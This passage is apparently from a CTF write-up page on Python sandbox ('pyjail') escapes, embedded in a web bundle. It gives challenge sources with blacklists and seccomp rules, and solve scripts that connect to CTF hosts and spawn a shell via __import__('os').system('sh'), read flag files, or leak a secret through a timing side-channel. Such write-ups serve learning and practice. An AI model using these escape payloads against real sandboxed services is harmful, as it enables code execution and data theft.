gg <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""</span>
ch <span class="token operator">=</span> <span class="token punctuation">[</span>dd<span class="token punctuation">,</span>ff<span class="token punctuation">,</span>gg<span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""eval(input());"""</span>
out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

var <span class="token operator">=</span> var2 <span class="token operator">=</span> <span class="token string">"C"</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span>char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    found <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token comment"># some dumb manual fixes</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"a"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"C"</span>
        var2 <span class="token operator">=</span> <span class="token string">"a"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"b"</span>
    <span class="token comment"># brute char</span>
    <span class="token keyword">for</span> brute <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        n <span class="token operator">=</span> ch<span class="token punctuation">[</span><span class="token number">1</span> <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span> <span class="token keyword">and</span> i<span class="token operator">!=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"START"</span><span class="token punctuation">,</span>brute<span class="token punctuation">)</span>
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string">"\\"</span>"<span class="token punctuation">:</span>
            char <span class="token operator">=</span> <span class="token string">"\\\\"</span><span class="token operator">+</span>char
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CHAR"</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR1"</span><span class="token punctuation">,</span> var<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR2"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span>
        check <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">69</span> <span class="token keyword">and</span> n <span class="token operator">==</span> n<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>
            found <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"COULDNT FIND VALID CHAR"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span class="token comment"># verify payload works</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
'Y\\',)"e"=:C(,',(C:="e"),'\\Y'
'Z\\',)"v"+C=:C(,',(C:=C+"v"),'\\Z'
'o\\',)"a"+C=:C(,',(C:=C+"a"),'\\o'
'd\\',)"l"+C=:C(,',(C:=C+"l"),'\\d'
'(\\',)"("+C=:C(,',(C:=C+"("),'\\('
'g\\',)"i"+C=:C(,',(C:=C+"i"),'\\g'
'b\\',)"n"+C=:C(,',(C:=C+"n"),'\\b'
'B\\',)"p"+C=:a(,',(a:=C+"p"),'\\B'
'=\\',)"u"+a=:C(,',(C:=a+"u"),'\\='
'=\\',)"t"+C=:b(,',(b:=C+"t"),'\\='
'j\\',)"("+b=:b(,',(b:=b+"("),'\\j'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'a\\',))b(lave(,',(eval(b)),'\\a'
"""</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge28.play.potluckctf.com'</span><span class="token punctuation">,</span><span class="token number">31337</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'palindrome?'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__import__('os').system('sh')"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Jl,Nn,Yp,$i,Kl,Pn,le,ue,Ji,Zl,Hn,F2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">locals</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string">'''</span><span class="token punctuation">,</span> <span class="token string">'""'</span><span class="token punctuation">,</span> <span class="token string">'(('</span><span class="token punctuation">,</span> <span class="token string">'[['</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'=='</span><span class="token punctuation">,</span>
                <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span>
                <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'...'</span><span class="token punctuation">,</span>
                <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'**'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>

        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> code<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">any</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> code <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Blacklisted word detected, exiting ..."</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Xl,Un,re,ke,Ki,Ql,Mn,R2=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.ifctf.fibonhack.it"</span><span class="token punctuation">,</span> <span class="token number">10010</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
for __name__ in __build_class__.__class__.__dir__.__qualname__:
    @__build_class__.__self__.exec
    @__build_class__.__self__.input
    class x:pass
"""</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span><span class="token string">"&#92;r"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__build_class__.__self__.print(__build_class__.__self__.open('./flag.txt').read())"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,su,Sn,Gp,Zi,nu,Bn,ie,_e,Xi,au,qn,I2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> secret
<span class="token keyword">import</span> pyseccomp
<span class="token keyword">import</span> sys

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the treasure!"</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

f <span class="token operator">=</span> pyseccomp<span class="token punctuation">.</span>SyscallFilter<span class="token punctuation">(</span>defaction<span class="token operator">=</span>pyseccomp<span class="token punctuation">.</span>KILL<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'rt_sigaction'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'munmap'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit_group'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'brk'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">del</span> pyseccomp
<span class="token keyword">del</span> f
<span class="token keyword">del</span> sys

__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code>`,pu,zn,de,fe,Qi,tu,Wn,D2=`<code class="language-py">__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

some_unknown_and_very_long_identifier_name <span class="token operator">=</span> <span class="token string">"WACON2023&#123;[REDACTED]&#125;"</span></code>`,ou,Yn,me,be,s_,eu,Gn,j2=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"critical"</span>

<span class="token comment"># Find the offset for os._wrap_close on server (140)</span>
alph <span class="token operator">=</span> <span class="token string">b"&#123;&#125;0123456789abcdef"</span>
flag <span class="token operator">=</span> <span class="token string">"WACON2023&#123;"</span>
<span class="token comment"># flag = "WACON2023&#123;91d9cec468a8b22b57c2b091beb64bcc&#125;"</span>
index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token string">"&#125;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        <span class="token comment"># sh = remote("1.234.10.246", 55555)</span>
        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> <span class="token string">"og.py"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''[a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,b:=a["__import__"],c:=b("secret").__dir__()[-1],d:=b("secret").__getattribute__(c),a["exec"]("while True:&#92;n&#92;tpass") if (a["ord"](d[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]))==</span><span class="token interpolation"><span class="token punctuation">&#123;</span>guess<span class="token punctuation">&#125;</span></span><span class="token string"> else 1]'''</span></span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
                index <span class="token operator">+=</span> <span class="token number">1</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
                sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            index <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># [a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,a["exec"]("while True:&#92;n&#92;tpass") if True else 1]</span></code>`,cu,Vn,Vp,n_,lu,$n,ye,ge,a_,uu,Jn,N2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">Nobuffers</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> stream

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">writelines</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n"</span></span> <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">]</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stream<span class="token punctuation">,</span> attr<span class="token punctuation">)</span>

banned <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'\\(~&#125;?>&#123;&amp;/%&#96;)&lt;$|*=#!-+'0123456789;[] '</span><span class="token punctuation">)</span>
stdout <span class="token operator">=</span> Nobuffers<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"&#96;"""&#96;----------.........___
__============:' "" |==|__===========(=>=+    |           ,_, .-"&#96;--..._
  ;="|"|  |"| &#96;.____|__|__/===========(=>=+----+===-|---------&lt;---------_=-
 | ==|:|/| |   | o|.-'__,-|   .'  _______|o  &#96;----'|        __ __,.-'"
  "&#96;--""&#96;--"'"""&#96;.-+------'" .'  _L___,,...-----------"""""""   "
                  &#96;------""""""""

'''</span><span class="token punctuation">)</span>

stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Enter command: '</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> prompt<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>banned<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span><span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">exec</span><span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">:</span>__name__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code>`,ru,Kn,we,ve,p_,ku,Zn,P2=`<code class="language-py"><span class="token comment"># @quasar - eval("__import__('os').system('sh')")</span>
a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"sh".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@".system".format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"os".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"__build_class__.__self__.__import__".format
class\fa:..."""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span> <span class="token string">"&#92;r"</span><span class="token punctuation">)</span>

<span class="token comment"># @st4rn</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"starship-1.chal.crewc.tf"</span><span class="token punctuation">,</span> <span class="token number">40003</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'@__build_class__.__self__.exec&#92;r@__build_class__.__self__.input&#92;rclass\fx:pass'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'__build_class__.__self__.__import__("os").system("sh")'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,iu,Xn,$p,t_,_u,Qn,Ee,he,o_,du,sa,H2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys


<span class="token keyword">class</span> <span class="token class-name">Nobuffers</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">,</span> limit<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> stream
        self<span class="token punctuation">.</span>limit <span class="token operator">=</span> limit

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">></span> self<span class="token punctuation">.</span>limit<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Data exceeds the maximum limit of </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>limit<span class="token punctuation">&#125;</span></span><span class="token string"> characters"</span></span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">writelines</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
        datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n"</span></span> <span class="token keyword">for</span> data <span class="token keyword">in</span> datas <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>limit<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stream<span class="token punctuation">,</span> attr<span class="token punctuation">)</span>


blacklisted_chars <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'\\(~&#125;?>&#123;)&amp;/%&#96;&lt;$|*=#!-@+"'0123456789;'</span><span class="token punctuation">)</span>
blacklisted_words <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'unicode'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'enum'</span><span class="token punctuation">,</span>
